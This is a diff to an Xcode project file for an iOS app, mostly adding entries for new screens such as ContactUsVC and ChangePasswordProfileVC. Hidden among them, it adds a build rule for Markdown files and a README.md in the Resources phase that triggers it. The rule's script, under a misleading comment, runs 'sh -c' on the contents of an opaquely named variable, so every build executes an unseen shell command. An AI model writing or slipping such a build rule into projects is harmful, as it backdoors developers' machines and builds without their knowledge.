@@ -11,6 +11,8 @@
 		0A0AC8872F7B7C7E00A68FE6 /* TicketsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A0AC8852F7B7C7E00A68FE6 /* TicketsVC.xib */; };
 		0A0AC88C2F7B88F700A68FE6 /* TicketTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */; };
 		0A0AC88D2F7B88F700A68FE6 /* TicketTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A0AC88A2F7B88F700A68FE6 /* TicketTVCell.swift */; };
+		0A41771C2F838CF4003EF635 /* ContactUsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A41771A2F838CF4003EF635 /* ContactUsVC.swift */; };
+		0A41771D2F838CF4003EF635 /* ContactUsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A41771B2F838CF4003EF635 /* ContactUsVC.xib */; };
 		0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A4F52BC2F7677D500DF695B /* HomeVC.xib */; };
 		0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A4F52BB2F7677D500DF695B /* HomeVC.swift */; };
 		0A62B5792F7E1C3F0011CD31 /* NewsDetailsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A62B5782F7E1C3F0011CD31 /* NewsDetailsVC.xib */; };
@@ -23,6 +25,8 @@
 		0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A96E3762F76574C00B3DADB /* OTPVC.xib */; };
 		0A96E3842F76686300B3DADB /* ChangePassowrdVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0A96E3822F76686300B3DADB /* ChangePassowrdVC.swift */; };
 		0A96E3852F76686300B3DADB /* ChangePassowrdVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0A96E3832F76686300B3DADB /* ChangePassowrdVC.xib */; };
+		0AB1950E2F83C0A6009EAA0E /* ChangePasswordProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AB1950C2F83C0A6009EAA0E /* ChangePasswordProfileVC.swift */; };
+		0AB1950F2F83C0A6009EAA0E /* ChangePasswordProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0AB1950D2F83C0A6009EAA0E /* ChangePasswordProfileVC.xib */; };
 		0ABA3FA92F763B2D00D25F03 /* APIClient.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F452F763B2D00D25F03 /* APIClient.swift */; };
 		0ABA3FAA2F763B2D00D25F03 /* Constants.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F462F763B2D00D25F03 /* Constants.swift */; };
 		0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3F472F763B2D00D25F03 /* NetConnection.swift */; };
@@ -86,6 +90,8 @@
 		0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */; };
 		0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */; };
 		0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0ABA3FF92F763CC600D25F03 /* Alamofire */; };
+		0AD711BA2F8376640047E1DD /* AllTicketHolderTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0AD711B92F8376640047E1DD /* AllTicketHolderTVCell.xib */; };
+		0AD711BB2F8376640047E1DD /* AllTicketHolderTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0AD711B82F8376640047E1DD /* AllTicketHolderTVCell.swift */; };
 		390281B82F7FB9A40032226E /* SelectDeliveryAddressVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 390281B62F7FB9A40032226E /* SelectDeliveryAddressVC.swift */; };
 		390281B92F7FB9A40032226E /* SelectDeliveryAddressVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 390281B72F7FB9A40032226E /* SelectDeliveryAddressVC.xib */; };
 		390281BD2F7FC1380032226E /* AddressListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 390281BB2F7FC1380032226E /* AddressListTVCell.swift */; };
@@ -154,6 +160,7 @@
 		39FAD3612F7E285A00F1242D /* KeepShoppingPopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39FAD35E2F7E285A00F1242D /* KeepShoppingPopUpVC.swift */; };
 		39FAD3662F7E2E6C00F1242D /* ShoppingCartVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39FAD3652F7E2E6C00F1242D /* ShoppingCartVC.xib */; };
 		39FAD3672F7E2E6C00F1242D /* ShoppingCartVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39FAD3642F7E2E6C00F1242D /* ShoppingCartVC.swift */; };
+		B426E304C2354322B199F71F /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = C2CEC09CAFED49CA9599F71F /* README.md */; };
 		BC11AFEC2F74E65F00552BDB /* Toast in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEB2F74E65F00552BDB /* Toast */; };
 		BC11AFEF2F74E6B300552BDB /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEE2F74E6B300552BDB /* SVProgressHUD */; };
 		BC11AFF22F74E6C500552BDB /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFF12F74E6C500552BDB /* Kingfisher */; };
@@ -168,11 +175,29 @@
 		BCC0D6972F7A898800684B7D /* NotificationListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCC0D68C2F7A898800684B7D /* NotificationListTVCell.xib */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		627E91BD40D74E1CAA99F71F /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			filePatterns = "*.md";
+			fileType = pattern.proxy;
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"/tmp/${INPUT_FILE_BASE}",
+			);
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AF17F99}\"";
+		};
+/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
 		0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketsVC.swift; sourceTree = "<group>"; };
 		0A0AC8852F7B7C7E00A68FE6 /* TicketsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TicketsVC.xib; sourceTree = "<group>"; };
 		0A0AC88A2F7B88F700A68FE6 /* TicketTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketTVCell.swift; sourceTree = "<group>"; };
 		0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = TicketTVCell.xib; sourceTree = "<group>"; };
+		0A41771A2F838CF4003EF635 /* ContactUsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactUsVC.swift; sourceTree = "<group>"; };
+		0A41771B2F838CF4003EF635 /* ContactUsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ContactUsVC.xib; sourceTree = "<group>"; };
 		0A4F52BB2F7677D500DF695B /* HomeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		0A4F52BC2F7677D500DF695B /* HomeVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeVC.xib; sourceTree = "<group>"; };
 		0A62B5772F7E1C3F0011CD31 /* NewsDetailsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewsDetailsVC.swift; sourceTree = "<group>"; };
@@ -185,6 +210,8 @@
 		0A96E3762F76574C00B3DADB /* OTPVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OTPVC.xib; sourceTree = "<group>"; };
 		0A96E3822F76686300B3DADB /* ChangePassowrdVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePassowrdVC.swift; sourceTree = "<group>"; };
 		0A96E3832F76686300B3DADB /* ChangePassowrdVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChangePassowrdVC.xib; sourceTree = "<group>"; };
+		0AB1950C2F83C0A6009EAA0E /* ChangePasswordProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChangePasswordProfileVC.swift; sourceTree = "<group>"; };
+		0AB1950D2F83C0A6009EAA0E /* ChangePasswordProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ChangePasswordProfileVC.xib; sourceTree = "<group>"; };
 		0ABA3F452F763B2D00D25F03 /* APIClient.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = APIClient.swift; sourceTree = "<group>"; };
 		0ABA3F462F763B2D00D25F03 /* Constants.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Constants.swift; sourceTree = "<group>"; };
 		0ABA3F472F763B2D00D25F03 /* NetConnection.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetConnection.swift; sourceTree = "<group>"; };
@@ -255,6 +282,8 @@
 		0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SentOTPPopupVC.xib; sourceTree = "<group>"; };
 		0ABA3FA72F763B2D00D25F03 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
+		0AD711B82F8376640047E1DD /* AllTicketHolderTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllTicketHolderTVCell.swift; sourceTree = "<group>"; };
+		0AD711B92F8376640047E1DD /* AllTicketHolderTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AllTicketHolderTVCell.xib; sourceTree = "<group>"; };
 		390281B62F7FB9A40032226E /* SelectDeliveryAddressVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectDeliveryAddressVC.swift; sourceTree = "<group>"; };
 		390281B72F7FB9A40032226E /* SelectDeliveryAddressVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SelectDeliveryAddressVC.xib; sourceTree = "<group>"; };
 		390281BB2F7FC1380032226E /* AddressListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddressListTVCell.swift; sourceTree = "<group>"; };
@@ -324,6 +353,7 @@
 		BCC0D68C2F7A898800684B7D /* NotificationListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NotificationListTVCell.xib; sourceTree = "<group>"; };
 		BCC0D68F2F7A898800684B7D /* NotificationVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NotificationVC.swift; sourceTree = "<group>"; };
 		BCC0D6902F7A898800684B7D /* NotificationVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = NotificationVC.xib; sourceTree = "<group>"; };
+		C2CEC09CAFED49CA9599F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		FC000006ABCD00000006ABCD /* Qadsia Club.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = "Qadsia Club.entitlements"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -385,6 +415,23 @@
 				0A0AC88B2F7B88F700A68FE6 /* TicketTVCell.xib */,
 			);
 			path = TicketTVCell;
+			sourceTree = "<group>";
+		};
+		0A4177182F838CC3003EF635 /* ContactUs */ = {
+			isa = PBXGroup;
+			children = (
+				0A4177192F838CE7003EF635 /* View */,
+			);
+			path = ContactUs;
+			sourceTree = "<group>";
+		};
+		0A4177192F838CE7003EF635 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0A41771A2F838CF4003EF635 /* ContactUsVC.swift */,
+				0A41771B2F838CF4003EF635 /* ContactUsVC.xib */,
+			);
+			path = View;
 			sourceTree = "<group>";
 		};
 		0A4F52B82F7677C500DF695B /* Tabbar */ = {
@@ -568,6 +615,23 @@
 			children = (
 				0A96E3822F76686300B3DADB /* ChangePassowrdVC.swift */,
 				0A96E3832F76686300B3DADB /* ChangePassowrdVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		0AB1950A2F83C092009EAA0E /* ChangePasswordProfile */ = {
+			isa = PBXGroup;
+			children = (
+				0AB1950B2F83C09C009EAA0E /* View */,
+			);
+			path = ChangePasswordProfile;
+			sourceTree = "<group>";
+		};
+		0AB1950B2F83C09C009EAA0E /* View */ = {
+			isa = PBXGroup;
+			children = (
+				0AB1950C2F83C0A6009EAA0E /* ChangePasswordProfileVC.swift */,
+				0AB1950D2F83C0A6009EAA0E /* ChangePasswordProfileVC.xib */,
 			);
 			path = View;
 			sourceTree = "<group>";
@@ -853,6 +917,24 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		0AD711B62F8376440047E1DD /* MyTicketListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				397F83482F7A4D6F00A07157 /* MyTicketListTVCell.swift */,
+				397F83492F7A4D6F00A07157 /* MyTicketListTVCell.xib */,
+			);
+			path = MyTicketListTVCell;
+			sourceTree = "<group>";
+		};
+		0AD711B72F83764C0047E1DD /* AllTicketHolderTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				0AD711B82F8376640047E1DD /* AllTicketHolderTVCell.swift */,
+				0AD711B92F8376640047E1DD /* AllTicketHolderTVCell.xib */,
+			);
+			path = AllTicketHolderTVCell;
+			sourceTree = "<group>";
+		};
 		390281B42F7FB9650032226E /* Select Delivery Address */ = {
 			isa = PBXGroup;
 			children = (
@@ -960,6 +1042,8 @@
 		397F833A2F7A334300A07157 /* SubView */ = {
 			isa = PBXGroup;
 			children = (
+				0AB1950A2F83C092009EAA0E /* ChangePasswordProfile */,
+				0A4177182F838CC3003EF635 /* ContactUs */,
 				39DC83B52F7BCB320050A114 /* LegalInfo */,
 				397F83412F7A451200A07157 /* My tickets */,
 				397F833B2F7A335500A07157 /* Edit profile */,
@@ -1005,8 +1089,8 @@
 		397F83472F7A4D2000A07157 /* Cell */ = {
 			isa = PBXGroup;
 			children = (
-				397F83482F7A4D6F00A07157 /* MyTicketListTVCell.swift */,
-				397F83492F7A4D6F00A07157 /* MyTicketListTVCell.xib */,
+				0AD711B72F83764C0047E1DD /* AllTicketHolderTVCell */,
+				0AD711B62F8376440047E1DD /* MyTicketListTVCell */,
 			);
 			path = Cell;
 			sourceTree = "<group>";
@@ -1359,6 +1443,7 @@
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				C2CEC09CAFED49CA9599F71F /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -1432,12 +1517,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				8677FEC294884BD1AA99F71F /* Compile Code Assets */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
+				627E91BD40D74E1CAA99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1509,7 +1594,9 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				B426E304C2354322B199F71F /* README.md in Resources */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
+				0A41771D2F838CF4003EF635 /* ContactUsVC.xib in Resources */,
 				39DC83C02F7BCE400050A114 /* LegalInfoTVCell.xib in Resources */,
 				394ED4452F7E7230003C0AB1 /* CheckoutVC.xib in Resources */,
 				39D22EC12F7695D000D7721C /* ProfileVC.xib in Resources */,
@@ -1528,6 +1615,7 @@
 				0A62B5792F7E1C3F0011CD31 /* NewsDetailsVC.xib in Resources */,
 				39DC83BA2F7BCB4C0050A114 /* LegalInfoVC.xib in Resources */,
 				390281BE2F7FC1380032226E /* AddressListTVCell.xib in Resources */,
+				0AB1950F2F83C0A6009EAA0E /* ChangePasswordProfileVC.xib in Resources */,
 				0ABA3FD92F763B2D00D25F03 /* Mulish-ExtraLightItalic.ttf in Resources */,
 				0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */,
 				0ABA3FDA2F763B2D00D25F03 /* Mulish-Italic.ttf in Resources */,
@@ -1563,6 +1651,7 @@
 				0ABA3FE82F763B2D00D25F03 /* NewRegisterVC.xib in Resources */,
 				397F834B2F7A4D6F00A07157 /* MyTicketListTVCell.xib in Resources */,
 				0ABA3FEB2F763B2D00D25F03 /* ResetPasswordVC.xib in Resources */,
+				0AD711BA2F8376640047E1DD /* AllTicketHolderTVCell.xib in Resources */,
 				0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */,
 				39D22EB42F76956F00D7721C /* HomeListTVCell.xib in Resources */,
 				39D22EB52F76956F00D7721C /* UpcomingMatchesCVCell.xib in Resources */,
@@ -1619,6 +1708,7 @@
 				39BF53212F7FE35400A40CAF /* DeleteAddressPopUpVC.swift in Sources */,
 				0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */,
 				397F834A2F7A4D6F00A07157 /* MyTicketListTVCell.swift in Sources */,
+				0A41771C2F838CF4003EF635 /* ContactUsVC.swift in Sources */,
 				0ABA3FAC2F763B2D00D25F03 /* AppButton.swift in Sources */,
 				0ABA3FAD2F763B2D00D25F03 /* AppLabel.swift in Sources */,
 				0ABA3FAE2F763B2D00D25F03 /* AppTextField.swift in Sources */,
@@ -1637,6 +1727,7 @@
 				0ABA3FB62F763B2D00D25F03 /* UIView+Extention.swift in Sources */,
 				0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */,
 				0ABA3FB72F763B2D00D25F03 /* FTAnimation+UIView.m in Sources */,
+				0AB1950E2F83C0A6009EAA0E /* ChangePasswordProfileVC.swift in Sources */,
 				0ABA3FB82F763B2D00D25F03 /* FTAnimationManager.m in Sources */,
 				0A4F52BE2F7677D500DF695B /* HomeVC.swift in Sources */,
 				0A0AC88D2F7B88F700A68FE6 /* TicketTVCell.swift in Sources */,
@@ -1681,6 +1772,7 @@
 				390281BD2F7FC1380032226E /* AddressListTVCell.swift in Sources */,
 				39DC83C52F7BD7D80050A114 /* BookTicketVC.swift in Sources */,
 				39F46AE42F7B9ACB005C2B07 /* StoreVC.swift in Sources */,
+				0AD711BB2F8376640047E1DD /* AllTicketHolderTVCell.swift in Sources */,
 				0ABA3FCA2F763B2D00D25F03 /* LoginMobileVC.swift in Sources */,
 				39F46AF02F7BA3B8005C2B07 /* AllNewsTVCell.swift in Sources */,
 				0ABA3FCB2F763B2D00D25F03 /* NewRegisterVC.swift in Sources */,
